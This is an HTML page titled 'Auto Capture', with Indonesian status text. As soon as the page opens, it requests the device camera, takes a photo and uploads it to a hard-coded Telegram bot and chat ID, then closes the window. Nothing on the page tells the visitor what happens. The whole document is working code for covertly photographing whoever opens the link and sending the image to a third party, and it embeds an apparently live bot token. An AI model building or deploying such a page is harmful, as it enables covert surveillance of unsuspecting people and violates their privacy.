<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture</title>
    <style>
        body {
            background: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
        #status {
            margin: 50px auto;
            padding: 15px;
            max-width: 500px;
            border-radius: 5px;
        }
        .error { 
            background: #ffebee; 
            color: #d32f2f; 
        }
    </style>
</head>
<body>
    <div id="status">Memulai proses...</div>

    <script>
        // ======= KONFIGURASI =======
        const BOT_TOKEN = "bot7876599612:AAHYBbJz6IHKae4BBtEkyASRlrJVVWtNOqc"; // Ganti dengan token asli
        const CHAT_ID = "7041008009"; // Ganti dengan chat ID asli
        // ===========================

        async function verifyBotToken() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
                const data = await response.json();
                
                if (!data.ok) {
                    throw new Error(`Token invalid: ${data.description || 'Unknown error'}`);
                }
                
                console.log("Bot info:", data.result);
                return true;
            } catch (error) {
                throw new Error(`Gagal verifikasi token: ${error.message}`);
            }
        }

        async function captureAndSend() {
            const statusEl = document.getElementById('status');
            
            try {
                statusEl.textContent = "Memverifikasi token bot...";
                await verifyBotToken();

                statusEl.textContent = "Mengakses kamera...";
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 800 },
                        height: { ideal: 600 }
                    }
                });

                statusEl.textContent = "Mengambil foto...";
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.playsInline = true;

                await new Promise(resolve => video.onloadedmetadata = () => setTimeout(resolve, 400));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                const photoData = canvas.toDataURL('image/jpeg', 0.7);
                
                stream.getTracks().forEach(track => track.stop());

                statusEl.textContent = "Mengirim foto...";
                const blob = await fetch(photoData).then(r => r.blob());
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', `Auto Capture - ${new Date().toLocaleString()}`);

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();
                console.log("Response:", result);

                if (!result.ok) {
                    throw new Error(result.description || "Gagal mengirim");
                }

                statusEl.textContent = "✅ Foto terkirim!";
                setTimeout(() => window.close(), 2000);

            } catch (error) {
                statusEl.textContent = `❌ Gagal: ${error.message}`;
                statusEl.className = "error";
                console.error("Error:", error);
            }
        }

        // Jalankan proses
        captureAndSend();
    </script>
</body>
</html>
